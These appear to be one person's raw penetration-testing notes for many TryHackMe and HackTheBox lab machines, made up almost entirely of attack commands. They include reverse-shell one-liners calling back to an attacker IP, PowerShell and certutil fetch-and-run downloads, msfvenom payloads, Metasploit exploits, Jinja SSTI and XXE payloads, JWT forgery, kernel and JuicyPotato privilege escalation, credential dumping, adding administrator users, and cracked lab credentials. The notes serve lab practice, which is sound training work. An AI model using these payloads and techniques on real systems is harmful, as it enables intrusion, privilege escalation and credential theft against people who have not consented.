Get-Hotfix -Id KB4023834
	#find backup file
get-childitem -include *.bak* -recurse -erroraction silentlycontinue | get-content
	#find string file
get-childitem -recurse -erroraction silentlycontinue | select-string -pattern API_KEY
	#scheduled task
get-scheduledtask
	#find owner directory/file
Get-Acl C:\
Get-Acl file.txt
	##ps1 scripting
	#find string in each file
Get-ChildItem -Path C:\Users\Administrator\Desktop\emails -recurse |
Where-object {$.Attributes -ne "Directory"} |
ForEach-Object {
If (Get-Content $_.FullName | Select-String password) {echo $_.FullName}}
	#another script
$path = "C:\Users\Administrator\Desktop\emails\*"
$string_pattern = "password"
$command = Get-ChildItem -Path $path -Recurse | 
Select-String -Pattern $String_pattern
echo $command
	#oneliner script
Get-ChildItem -recurse | Select-String -pattern password
Get-ChildItem -recurse -erroraction silentlycontinue | Select-String -pattern password
	##simple portscan powershell
for ($i=130; $i -le 140; $i++){
	Test-NetConnection localhost -Port $i }
	##show hidden file
Get-ChildItem -Force
	##check permission
icacls C:\Important
	##set permission
icacls C:\Importatnt /setowner Users



Corp Tryhackme
===================================
	##bypass applocker
	#whitelisting directory C:\Windows\System32\spool\drivers\color
>C:\Windows\System32\spool\drivers\color\shell.exe
	#history powershell
>Get-Content C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
	#kerbeoasting extract account /w spn
>setspn -T medin -Q ​ */*
	#kerberoasting /w powershell
>iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
>Invoke-Kerberoast -OutputFormat hashcat ​| fl
hashcat -m 13100 -​a 0 hash.txt /opt/rockyou.txt --force
john --format=krb5tgs --wordlist=/opt/rockyou.txt hash.txt
xfreerdp /u:fela /d:corp /p:rubenF124 /v:10.10.230.87 /cert:ignore
>iex (new-object net.webclient).downloadstring('http://10.4.11.80/flagstr')
nc -lvp 80
	#privesc
>powershell
>Invoke-WebRequest -Uri 'http://10.4.11.80/PowerUp.ps1' -OutFile 'powerup.ps1'
>. .\powerup.ps1
>Invoke-AllChecks
>get content C:\Windows\Panther\Unattend\Unattended.xml
	#got base64 credz
>Invoke-WebRequest -Uri 'http://10.4.11.80/base64' -OutFile 'asd.txt'
	#got credz administrator:tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
evil-winrm -i 10.10.230.87 -u 'administrator' -p 'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' 





Mr Robot Tryhackme
========================================
python3 autorecon.py 10.10.149.120
http://10.10.149.120/robots.txt
wget http://10.10.149.120/fsocity.dic
wc fsocity.dic
cat fsocity.dic | sort -u | wc
cat fsocity.dic | sort -u > pass.txt
wpscan --url http://10.10.149.120/ -U elliot -P pass.txt --password-attack wp-login
	#got credz elliot:ER28-0652
	#reverse shell php
exec bash --login
nc -lvp 4242
>python -c 'import pty;pty.spawn("/bin/bash")'
>cat /home/robot/password.raw-md5
	#crack md5 hashcat
hashcat -m 0 -a 0 password.raw-md5 /opt/rockyou.txt
	#got credz robot:abcdefghijklmnopqrstuvwxyz
>su robot
>bash linpeas.sh | tee linpeas-robot.txt
>find / -perm -4000 -type f 2>/dev/null
	#nmap privesc
>nmap --interactive
>!sh
#id









Retro Tryhackme
========================================
	#find OS
nmap -O -p80 10.10.141.32 -Pn
python3 autorecon.py 10.10.141.32
gobuster dir -u http://10.10.141.32/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
wpscan --url http://10.10.141.32/retro/ -e u,vp,vt,cb
	#find comment and got credz Wade:parzival
	#windows php rev shell: https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php
change template to rev shell > http://10.10.141.32/retro/wp-content/themes/twentyseventeen/404.php
rlwrap nc -lvp 4242
>whoami /all
	#seimpoersonateprivilege enabled
	##juicypotato privesc
>cd C:\Users\Public
>certutil -urlcache -split -f http://10.4.11.80/JuicyPotato.exe j.exe
>j.exe
>certutil -urlcache -split -f http://10.4.11.80/nc.exe nc.exe
>j.exe -t * -l 1337 -p cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 10.4.11.80 4141"
nc -lvp 4141
>whoami
xfreerdp /u:Wade /v:10.10.141.32 /d:retro /p:parzival /cert:ignore
	##CVE-2019-1388 abuse UAC windows certificate
	#https://github.com/jas502n/CVE-2019-1388
	#https://www.youtube.com/watch?v=RW5l6dQ8H-8
wget https://github.com/jas502n/CVE-2019-1388/raw/master/HHUPD.EXE
>certutil -urlcache -split -f http://10.4.11.80/HHUPD.EXE HHUPD.exe
>run HHUPD.exe as Administrator > show more detail > show publisher certificate > 
	click issued by ... > browser IE > file > save page as > change path to  C:\Windows\System.cmd.exe > cmd poped up
>whoami
	##kernel exploit windows server 2016 CVE-2017-0213
	#https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/CVE-2017-0213/CVE-2017-0213_x64.zip
unzip CVE-2017-0213_x64.zip
>certutil -urlcache -split -f http://10.4.11.80/CVE-2017-0213_x64.exe asd.exe
	#need rdp access
>asd.exe
	#new cmd poped up with system privilege
	##windows exploit suggester error
	#error accured when query to windows server 2016
add 2016 in line 959 on osnamearray
	["2012","2012"],
	["2016","2016"],
	["8.1","8.1"],
	##how to find kernel exploit
>systeminfo
search google microsoft windows server 2016 standard build "14393"
open microsoft website windows release info
search "14393" and find tab availability
got date 10/15/2016
go to payloadallthethings swisskyrepo
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
find "kernel"
list 2016
check CVE date release






TonyTheTiger Tryhackme
=====================================
nmap -O -p80 10.10.141.32 -Pn
python3 autorecon.py 10.10.18.13
http://10.10.18.13:8080
http://10.10.18.13:8080/admin-console
	#login jboss with default credential
	#admin:admin
	##CVE-2015-7501
	##exploit Jboss AS 6 Deserialization of Untrusted Data
unzip jboss.zip
python exploit.py 10.10.18.13:8080 'ping 10.4.11.80 -c 1'
sudo tcpdump tun0 icmp
	#got RCE
python exploit.py 10.10.18.13:8080 'nc -e /bin/bash 10.4.11.80 4242'
nc -lvp 4242
>python -c 'import pty;pty.spawn("/bin/bash")'
>cat /home/jboss/note
	#got credz jboss:likeaboss
>su jboss
>sudo -l
	#(ALL) NOPASSWD: /usr/bin/find
	##find privec
>sudo find . -exec /bin/bash \; -quit
#cat /root/root.txt
echo QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y== | base64 -d | hashid
	#found md5 hash
hashcat -m 0 -a 0 asd /opt/rockyou.txt
	##another working exploit java deserialization
git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
pip install -r requires.txt
python3 jexboss.py -u http://10.10.18.13:8080






Ghostcat Tryhackme
====================================
nmap -O -p80 10.10.111.97 -Pn
ping 10.10.111.97
john --format=gpg --wordlist=/opt/rockyou.txt hash.txt
python3 autorecon.py 10.10.111.97
http://10.10.111.97:8080
	#tomcat 9.0.30
	#CVE-2020-1938 tomcat AJP ghostcat file inclution
	#find ajp port (default 8009)
nmap -p 8009 10.10.111.97
wget https://github.com/00theway/Ghostcat-CNVD-2020-10487
python3 ajpShooter.py http://10.10.111.97 8009 /WEB-INF/web.xml read
	#got credz skyfuck:8730281lkjlkjdqlksalks
ssh skyfuck@10.10.111.97
	#decrypt pgp gpg file
>gpg --import tryhackme.asc
>gpg --decrypt credential.pgp
>gpg --decrypt --no-use-agent credential.pgp
	#need password, crack .asc file with john
gpg2john tryhackme.asc > hash.txt
john --format=gpg --wordlist=/opt/rockyou.txt hash.txt
	#got credz merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
>su merlin
>sudo -l
	(root : root) NOPASSWD: /usr/bin/zip
	#zip privesc
>zip $TF(mktemp -u)
>sudo zip $TF /etc/hosts -T -TT 'sh #'
#id
#rm $TF
	#zip privesc
>sudo zip mktemp -u /tmp -T -TT 'sh #'








BluePrint Tryhackme
=======================================
sudo autorecon 10.10.9.12
http://10.10.9.12:8080/
http://10.10.9.12:8080/oscommerce-2.3.4/catalog/
	#oscommerece 2.3.4
searchsploit oscommerece 2.3
	#exploit oscommerce 2.3 rce
	#installation data exist and abused got rce
searchsploit -m 50128
python3 50128.py http://10.10.9.12:8080/oscommerce-2.3.4/catalog/
>whoami
	#pwd windows show current dirrectory
>echo %cd%
>certutil -urlcache -split -f http://10.4.11.80/shell.php C:\xampp\htdocs\oscommerce-2.3.4\catalog\shell2.php
http://10.10.9.12:8080/oscommerce-2.3.4/catalog/shell.php
	#p0wny shell work on windows
>certutil -urlcache -split -f http://10.4.11.80/nc.exe C:\users\administrator\desktop\nc.exe
	#windows nc reverse shell
>nc.exe -e cmd.exe 10.4.11.80 4242
rlwrap nc -lvp 4242
>whoami
	#add user windows
>net user username password /add
>net user tai tai /add
	#add user to administrator
>net localgroup administrators tai /add
	#extract ntlm hash dump ntlm hash
	#https://www.hackingarticles.in/credential-dumping-ntds-dit/
locate fgdump
>certutil -urlcache -split -f http://10.4.11.80/fgdump.exe C:\users\administrator\desktop\fgdump.exe
>fgdump.exe
	#got credz ab:1000:NO PASSWORD*********************:30E87BF999828446A1C1209DDDE4C450:::









Ignite Tryhackme
=======================================
sudo autorecon.py 10.10.117.82
http://10.10.117.82/fuel
	##exploit fuel cms 1.4 RCE
searchsploit fuel cms 1.4
searchsploit -m 47138
	#change url
python 47138.py
>id
>wget 10.4.11.80/shell.php
	#fuel cms config file
	#~/fuel/application/config/
>cat /var/www/html/fuel/application/config/config.php
>cat /var/www/html/fuel/application/config/database.php
	#got mysql credz root:mememe
>su root
password: mememe
#id









Source Tryhackme
==========================================
sudo autorecon 10.10.134.226
	#webmin
https://10.10.134.226:10000
	#wfuzz error pycurl
git clone https://github.com/pycurl/pycurl
cd pycurl
sudo apt-get install libssl-dev
sudo python3 setup.py install
wfuzz -h
	#no error and can request https
	#wfuzz filter size
wfuzz -c -w /usr/.../directory-list-2.3-small.txt --hc 404 --hh 3727 https://10.10.134.226:10000/FUZZ.txt
cat tcp_10000_http_nmap.txt
	#miniserv 1.890 (webmin httpd)
	#enumerate webmin version from nmap
searchsploit webmin
	##CVE-2019-15107 webmin backdoor rce password_change.cgi
	#use metasploit
msfconsole
>search webmin
>use exploit/linux/http/webmin_backdoor
>set rhosts 10.10.134.226 set lhost 10.4.11.80
>set ssl true
>run
#id
	#stable reverse shell
#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.11.80 4141 >/tmp/f
nc -lvp 4141
	##CVE-2019-15107 without metasploit
wget https://github.com/MuirlandOracle/CVE-2019-15107
python3 CVE-2019-15107.py -h
python3 CVE-2019-15107.py -s 10.10.134.226
	#based on this https://medium.com/@knownsec404team/backdoor-exploration-of-webmin-remote-code-execution-vulnerabilities-cve-2019-15107-55234c0bd486
	#webmin vulnerable at version 1.930<1.920-1.910-1.900-1.890<=1.880









IntroToShell Tryhackme
============================================
	##socat windows
git clone https://github.com/StudioEtrange/socat-windows
cd socat-windows
zip -q asd.zip *
python -m SimpleHTTPServer 80
>certutil -urlcache -split -f http://10.4.11.80/asd.zip asd.zip
	#unzip windows
>tar -xf asd.zip
>socat.exe -h
	##windows socat reverse shell
>socat.exe -d -d TCP:10.4.11.80:4141 EXEC:cmd.exe,pipes,pty
socat - tcp4-listen:4141
>socat.exe -d -d TCP:10.4.11.80:4141 EXEC:powershell.exe,pipes
nc -lvp 4141
	#windows socat bind shell
>socat TCP-L:4242 EXEC:powershell.exe,pipes
socat -d -d -d - TCP4:10.10.238.13:4141
nc 10.10.238.13 4141


Anthem Tryhackme
======================================
sudo autorecon 10.10.191.50
http://10.10.191.50/robots.txt
	#got pass UmbracoIsTheBest!
		#enumerate user on website
hydra -t 1 -V -f -L user.txt -p UmbracoIsTheBest! rdp://10.10.191.50
	#got rdp success SG:UmbracoIsTheBest!
xfreerdp /u:sg /p:UmbracoIsTheBest! /cert:ignore /v:10.10.232.218
	#password in hidden file
	#show history explorer
run -> recent -> there is backup directory
cd C:\
dir /a
get-childitem -force
	#search hidden directory
Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue -Attributes Directory | where { $_.Attributes -match "Hidden"}
Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue -Attributes !Directory | where { $_.Attributes -match "Hidden"}
cd c:\backup
type restore.txt
	access denied
right click -> properties -> add owner
	#got possible password ChangeMeBaby1MoreTime
runas /noprofile /user:administrator cmd.exe








Zthobscurewebvulns Tryhackme
======================================
	##SSTI
payload = {{7*7}}
SSTI Jinja
	#read file
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}
	#OS command
{{+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()+}}
	#rev shell
{{+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('wget 10.4.11.80/rev.sh').read()+}}
{{+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash rev.sh').read()+}}
nc -lvp 4242
	#auto ssti
git clone https://github.com/epinna/tplmap
sudo pip install -r req.txt
python tplmap.py -h
python tplmap.py -u 'http://10.10.26.33/' -d 'name'
python tplmap.py -u 'http://10.10.26.33/' -d 'name' --os-cmd id

	##Json Web Token JWT
header.payload.secret
header
	{"typ":"JWT","alg":"RS256"}
	#change using HS256 new-header
	{"typ":"JWT","alg":"HS256"}
	#change to hex public key
cat public.pem | xxd -p | tr -d "\\n" > asd
	#encrypt header.payload
echo -n "header.payload" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$asd
	#got valid HS256 key
	#create secret with HS256 key
python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$HS256key')).replace('=','')\")"
	#got new-secret
	#new JWT 
new-header.payload.new-secret
	##abuse JWT none algorithm
header.payload.secret
header
	{"typ":"JWT","alg":"RS256"}
	#change algorithm to none
	{"typ":"JWT","alg":"none"}
	#new JWT
new-header.new-payload.
	#bruteforce JWT
git clone https://github.com/brendan-rius/c-jwt-cracker
sudo make
./jwtcracker token abcdefghijklmnopqrstuvwxyz 4

	##XXE
intercept burp
every request with XML format and echo back XML data could be XXE
<?xml version="1.0"?>
...
<email>asdasd</email>
...
	#data <email> asdasd are echoed back
	#injection
<?xml version="1.0"?>
<!DOCTYPE email [<!ELEMENT email ANY>
<!ENTITY xxe SYSTEM 'file:///etc/passwd'>
]>
...
<email>&xxe;</email>
...
	#retreived data /etc/passwd
	#XXE RCE with expect module
...
<!ENTITY xxe SYSTEM 'expect://id'>
...
	#expect module not installed by default





Ice Tryhackme
======================================
sudo autorecon 10.10.2.196
nmap -p 8000 -sV 10.10.2.196
	#exploit ice streaming media server
msfconsole
search icecast
use exploit/windows/http/icecast_header
set rhost 10.10.2.196 lport 8000 lhost 10.4.11.80 lport 4242
run
>getuid
>run post/multi/recon/local_exploit_suggester
	#bypass UAC eventvwr privesc
>background
>use exploit/windows/local/bypassuac_eventvwr
>set session 1 lhost 10.4.11.80 lport 4141
>run
>getuid
	#still current user
>getprivs
	#current user are now in administrators group
	#migrate to get system user
>ps
>migrate -N spoolsv.exe
>getuid
	NT AUTHORITY\SYSTEM
	#mimikatz metasploit known as kiwi
>load kiwi
>help
>creds_all
>dcsync_ntlm
>screenshare






Ice Tryhackme Without Metasploit
=======================================
wget https://github.com/ivanitlearning/CVE-2004-1561/blob/master/568-edit.c
	#create payload in C
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.4.11.80 LPORT=4242 -b '\x0a\x0d\x00' -f c
gcc 568-eidt.c -o 568
./568 10.100.162.85
rlwrap nc -lvp 4242
>whoami
>systeminfo
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2021-08-25-mssb.xls --systeminfo systeminfo-ice.txt
	#exploit MS14-058 CVE-2014-4113
	#Microsoft Windows 7 Professional
	#6.1.7601 service Pack 1 Build 7601
	#hitfix KB2534111 KB976902
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-058/CVE-2014-4113-Exploit.rar
unrar e CVE-2014-4113-Exploit.rar
>certutil -urlcache -split -f http://10.4.11.80/Wind64.exe
>Win64.exe whoami
>ex.exe shell.exe
	##eternalblue
python eternal_checker.py 10.10.210.191
cd shellcode && ./shell_prep.sh
nc -lvp 4444
nc -lvp 5555
cd shellcode && ./shell_prep.sh
python eternalblue_exploit7.py 10.10.210.191 shellcode/sc_all.bin






Legacy HTB
=======================================
sudo autorecon 10.10.10.4
cat enum4linux.txt
	#OS version Windows XP Proffesional SP3
	#google search 'exploit eternalblue windows XP'
	#exploit ms08-067 metasploit
msfconsole
search ms08-067
info exploit/windows/smb/ms08_067_netapi
use exploit/windows/smb/ms08_067_netapi
set rhost 10.10.10.4
set lport 10.10.14.6
set lport 9898
run
>getuid
	NT AUTHORITY\SYSTEM
	#manual exploit ms08-067
wget https://github.com/areyou1or0/OSCP/blob/master/Scripts%20-%20MS08-067
python ms08-06.py
nano ms08-067.py
	#change payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
python ms08-067.py 10.10.10.4 6 445
nc -lvp 4321
>whoami
impacket-smbserver asd .
>copy \\10.10.14.6\asd\whoami.exe .
>whoami
	NT AUTHORITY\SYSTEM
>type "C:\Documents and Settings\Administrator\Desktop\root.txt"








Devel HTB
=====================================
sudo autorecon 10.10.10.5
	#reverse shell aspx
wget wget https://github.com/borjmz/aspx-reverse-shell/raw/master/shell.aspx
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4242 -f aspx -o shell.aspx
ftp 10.10.10.5
>dir
	#transfer binary ftp binary
>binary
	200 set type to I
>put shell.aspx
rlwrap nc -lvp 4321
http://10.10.10.5/shell.aspx
>whoami
	#iss apppool/web
>systeminfo
	Microsoft Windows 7 Enterprise
	6.1.7600 N/A Build 7600
>whoami /priv
	#juicy potato seimpersonateprivilege pirvesc
wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe > rshell.exe
>copy \\10.10.14.6\ads\jpx86.exe .
>copy \\10.10.14.6\ads\rshell.exe .
>jpx86.exe
>jpx86.exe -t * -l 1337 -p rshell.exe
	#got error maybe because CLSID
	#source to find CLSID
	#https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise/
	#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
>jpx86.exe -t * -l 1337 -p rshell.exe -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
rlwrap nc -lvp 4444
>whoami
	NT AUTHORITY\SYSTEM
	#another privesc ms11-046
wget https://github.com/am0nsec/exploit/raw/master/windows/privs/MS11-046/ms11-046.c
i686-w64-mingw32-gcc MS11-046.c -o ex.exe -lws2_32
	#error compile 32bit
sudo apt-get install mingw-w64
i686-w64-mingw32-gcc MS11-046.c -o ex.exe -lws2_32
ftp 10.10.10.5
>binary
>put ex.exe
>cd inetpub\wwwroot
>ex.exe
>whoami
	nt authority\system






Blue Hackthebox
======================================
sudo autorecon 10.10.10.40
	#eternalblue exploit ms17-10
msfconsole
>search eternalblue
>use exploit/windows/smb/ms17_010_eternalblue
>set lhost 10.10.14.6 set lport 9898 set rhost 10.10.10.40
>run
>getuid
	NT AUTHORITY\SYSTEM
	#eternalblue without metasploit
	#Microsoft Windows 7 Professional
	#6.1.7601 Service Pack 1 Build 7601
searchsploit eternalblue
searchsploit -m 42315
nano 42315.py
	#change username to "//" because default configuration
	#change def smb_pwn
	#mark print pwned.txt and change into this:
		smb_send_file(smbConn, 'rshell.exe', 'C', '/rshell.exe')
		service_exec(conn, r'c:\rshell.exe')
python 42315.py
	#got error MYSMB
	#download and add to same directory
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
python 42315.py
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
python 42315.py 10.10.10.40
rlwrap nc -lvp 4321
>whoami
	nt authority\system





Optimum Hackthebox
====================================
sudo autorecon 10.10.10.8
http://10.10.10.80
	#http file server 2.3
searhsploit http file server 2.3
searchsploit -m 49584
	#exploit rejetto hfs 2.3
python3 49584.py
nc -lvp 4242
>whoami
	optimum\kostas
>systeminfo > systeminfo-optimum.txt
python windows-exploit-suggester.py --database 2021-08-27-mssb.xls --systeminfo systeminfo-optimum.txt
	#exploit ms16-032 privesc
	#Microsoft Windows Server 2012 R2 Standard
	#6.3.9600 N/A Build 9600
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4141 -f exe > exp.exe
>copy \\10.10.14.6\asd\exp.exe
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.6 lport 4141
run
>./exp.exe
>getuid
	optimum/kostas
>run post/mlti/recon/local_exploit_suggester
>backgroud
use exploit/windows/local/bypassuac_eventvwr
set session 1 lhost 10.10.14.6 lport 1414
run
>getuid
	NT AUTHORITY\SYSTEM
	#privsc without metasploit
python windows-exploit-suggester.py --database 2021-08-27-mssb.xls --systeminfo systeminfo-optimum.txt
	#try every suggester
	#exploit ms16-098
	#Microsoft Windows Server 2012 R2 Standard
	#6.3.9600 N/A Build 9600
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
>copy \\10.10.14.6\asd\41020.exe
>41020.exe
>whoami
	nt authority\system










Bastard Hackthebox
=====================================
sudo autorecon 10.10.10.9
http;//10.10.10.9
http;//10.10.10.9/robots.txt
http://10.10.10.9/CHANGELOG.txt
	#check drupal version, Drupal 7.54, 2017-02-01
searchsploit drupal 7.5
	#exploit drupalgeddon2
wget https://github.com/PolarisLab/Drupal-Exploit/raw/master/Drupal-Exploit.php
	#php server web buildin
php -S 0.0.0.0:8888
http://localhost:8888/Drupal-Exploit.php
	#fail
wget https://github.com/dreadlocked/Drupalgeddon2
ruby drupalgeddon2.rb
	#error cannot load such file -- highline/import
sudo gem install highline
./drupalgeddon2.rb http://10.10.10.9/
>whoami
	nt authority\iusr
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
>copy \\10.10.14.6\asd\rshell.exe
>rshell.exe
rlwrap nc -lvp 4321
>whoami /priv
	#SeImpersonatePrivilege privesc 
	#Microsoft Windows Server 2008 R2 Datacenter
	#6.1.7600 N/A Build 7600
>copy \\10.10.14.6\asd\JuicyPotato.exe potato.exe
>potato.exe -h
>potato.exe -t * -l 1337 -p rshell.exe .
	#error CLSID
	#CLSID Windows Server 2008 R2 Enterprise
	#https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/
>potato.exe -t * -l 1337 -p rshell.exe -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
rlwrap nc -lvp 4321
>whoami
	nt authority\system
	#another privesc kernel exploit
	#MS15-051
	#Microsoft Windows Server 2008 R2 Datacenter
	#6.1.7600 N/A Build 7600
https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip
unzip MS15-051-KB3045171.zip
>copy \\10.10.14.6\asd\ms15-051x64.exe
>ms15-051x64.exe whoami
	nt authority\system










Granny Hackthebox
=======================================
sudo autorecon 10.10.10.15
cat tcp_80_nikto.txt
	#put method allowed
	#put curl proxy
curl -T asd.txt http://10.10.10.15/ -x http://127.0.0.1:8080
	203 found
	#IIS 6.0
	#webdav buffer overflow
wget https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell -O iisrev.py
iisrev.py 10.10.10.15 80 10.10.14.6 4321
rlwrap nc -lvp 4321
>whoami
	nt authority\network service
>cd c:\
>mkdir temp
>cd temp
>systeminfo
	#kernel ms08-066 privesc
	#Microsoft(R) Windows(R) Server 2003, Standard Edition x86
	#5.2.3790 Service Pack 2 Build 3790
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-066/ms08066%E6%8F%90%E6%9D%83(XP%202003).zip -O ms08066.zip
unzip ms08066.zip
>copy \\10.10.14.6\asd\ms08066.exe
>ms08066.exe
	#got administrator shell
>type "c:\documents and settings\administrator\desktop\root.txt"
	#enumerate webdav
davtest -url http://10.10.10.15
	#only can upload .txt and .html file
	#method move enabled
	#webdav tool
cadaver http://10.10.10.15
>ls
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9090 -f aspx -o a.aspx
>put a.aspx
	403 Forbidden
>put a.txt
>move a.txt a.aspx
rlwrap nc -lvp 9090
curl http://10.10.10.14/a.aspx
>whoami
	nt authority\network service
>whoami /priv
	#privesc seimpersonateprivilege windows server 2003
	#Microsoft(R) Windows(R) Server 2003, Standard Edition x86
	#5.2.3790 Service Pack 2 Build 3790
wget https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
>copy \\10.10.14.6\asd\churrasco.exe
>churrasco.exe
>churassco.exe whoami
>churrasco -d "cmd.exe"
>whoami
	#unstable shell
	#try to type exit magically work
>exit
>whoami
	nt authority\system
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9191 -f exe -o b.exe
>copy \\10.10.14.6\asd\b.exe
>churrasco -d "b.exe"
nc -lvp 9191
>whoami
	nt authority\system







Arctic Hackthebox
====================================
sudo autorecon 10.10.10.11
http://10.10.10.11:8500/
http://10.10.10.11:8500/CFIDE/administrator/
	#exploit adobe coldfusion 8
searchsploit adobe cold fusion 8
searchsploit -m 50057
nano 50057.py
	#change rhost rport lhost lport
python3 50057.py
>whoami
	arctic/tolis
>whoami /rpiv
	#seimpoersonateprivilege privesc
	#Microsoft Windows Server 2008 R2 Standard
	#6.1.7600 N/A Build 7600
>mkdir temp
cd c:\temp
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
>copy \\10.10.14.6\asd\rshell.exe
>copy \\10.10.14.6\asd\JuicyPotato.exe potato.exe
>potato.exe -h
>potato.exe -t * -l 1337 -p rshell.exe .
rlwrap nc -lvp 4321
>whoami
	nt authority\system
	#MS10-059 privesc
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe
>copy \\10.10.14.6\asd\MS10-059.exe
>MS10-059.exe 10.10.14.6 4141
nc -lvp 4141
>whoami
	nt authority\system
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/Churraskito_exe.zip
unzip Churraskito_exe.zip
>copy \\10.10.14.6\asd\Churraskito.exe
>Churraskito.exe "C:\windows\system32\cmd.exe" "net user tai tai /add"

	#set proxy exploit burp
proxy -> options -> add -> bind port '8500' -> 
request handling host '10.10.10.11' host '8500' -> ok
nano 50057.py
	#change rhost '127.0.0.1' rport lhost lport
python3 50057.py





Grandpa
======================================
Granny Hackthebox
=======================================
sudo autorecon 10.10.10.14
cat tcp_80_nikto.txt
	#put method allowed
	#put curl proxy
curl -T asd.txt http://10.10.10.14/ -x http://127.0.0.1:8080
	403 Forbidden
	#fail
davtest -url http://10.10.10.14
cadaver http://10.10.10.14
>ls
	#all dav tools fail
	#exploit iis 6.0
wget https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell -O iisrev.py
iisrev.py 10.10.10.14 80 10.10.14.6 4321
rlwrap nc -lvp 4321
>whoami
	nt authority\network service
>cd c:\
>mkdir temp
>cd temp
>systeminfo
	#kernel ms08-066 privesc
	#Microsoft(R) Windows(R) Server 2003, Standard Edition x86
	#5.2.3790 Service Pack 2 Build 3790
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-066/ms08066%E6%8F%90%E6%9D%83(XP%202003).zip -O ms08066.zip
unzip ms08066.zip
>copy \\10.10.14.6\asd\ms08066.exe
>ms08066.exe
	#got administrator shell
>type "c:\documents and settings\administrator\desktop\root.txt"
	#another privesc
>whoami /priv
	#privesc seimpersonateprivilege windows server 2003
	#Microsoft(R) Windows(R) Server 2003, Standard Edition x86
	#5.2.3790 Service Pack 2 Build 3790
wget https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
>copy \\10.10.14.6\asd\churrasco.exe
>churrasco.exe
>churassco.exe whoami
>churrasco -d "cmd.exe"
>whoami
	#unstable shell
	#try to type exit magically work
>exit
>whoami
	nt authority\system
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9191 -f exe -o b.exe
>copy \\10.10.14.6\asd\b.exe
>churrasco -d "b.exe"
nc -lvp 9191
>whoami
	nt authority\system









Silo Hackthebox
=======================================
sudo autorecon 10.10.10.82
	#change space to :
cat asd| sed -e 's/\s/:/g' | cut -d ':' -f 5,7 > user.txt
	#base64 line
while IFS= read -r line; do echo -n $line | base64; done < user.txt > auth
mousepad auth
	##oracle database port 1521
nmap --script "oracle-tns-version" -p 1521 -T4 -sV 10.10.10.82
	#version 11.2.0.2.0
	#bruteforce SID
hydra -L sids-oracle.txt -s 1521 10.10.10.82 oracle-sid
	#offline crack oracle
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=XE -n 10.10.10.82
	#powerfull shit oracle pentest tool known as ODAT (oracle database attacking tools)
	#install odat
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
cd /opt/oracle/
	#download installclient-basic.rpm installclient-sqlplus.rpm installclient-devel.rpm
wget http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html
sudo apt-get install libaio1 python3-dev alien python3-pip
